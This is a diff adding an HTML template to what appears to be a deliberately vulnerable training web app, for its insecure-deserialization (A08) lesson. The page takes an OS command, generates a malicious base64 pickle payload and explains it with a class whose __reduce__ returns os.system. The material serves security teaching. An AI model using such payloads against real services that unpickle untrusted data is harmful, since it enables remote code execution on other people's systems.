@@ -1,0 +1,44 @@
+{% extends "base.html" %}
+{% block title %}A08 – Generate Payload{% endblock %}
+{% block content %}
+<h4><a href="/a08/">A08</a> — Malicious Pickle Payload Generator</h4>
+<div class="row">
+  <div class="col-md-6">
+    <div class="card mb-3">
+      <div class="card-body">
+        <form method="post">
+          <label class="form-label">OS Command to execute on deserialize</label>
+          <input name="command" class="form-control font-monospace mb-2"
+                 value="{{ command or 'id' }}" placeholder="id">
+          <button class="btn btn-danger w-100">Generate Payload</button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <div class="col-md-6">
+    {% if payload %}
+    <div class="card">
+      <div class="card-header text-danger">Generated Payload (base64)</div>
+      <div class="card-body">
+        <pre class="small" style="word-break:break-all">{{ payload }}</pre>
+        <a href="/a08/deserialize" class="btn btn-danger btn-sm mt-2">
+          → Send to /deserialize
+        </a>
+      </div>
+    </div>
+    <div class="card mt-3">
+      <div class="card-header text-secondary small">How it works</div>
+      <div class="card-body small text-secondary">
+        <pre>class RCEPayload:
+    def __reduce__(self):
+        import os
+        return (os.system, ("{{ command }}",))</pre>
+        When <code>pickle.loads()</code> is called, Python invokes
+        <code>__reduce__</code> which returns a callable + args.
+        Python then runs <code>os.system("{{ command }}")</code>.
+      </div>
+    </div>
+    {% endif %}
+  </div>
+</div>
+{% endblock %}
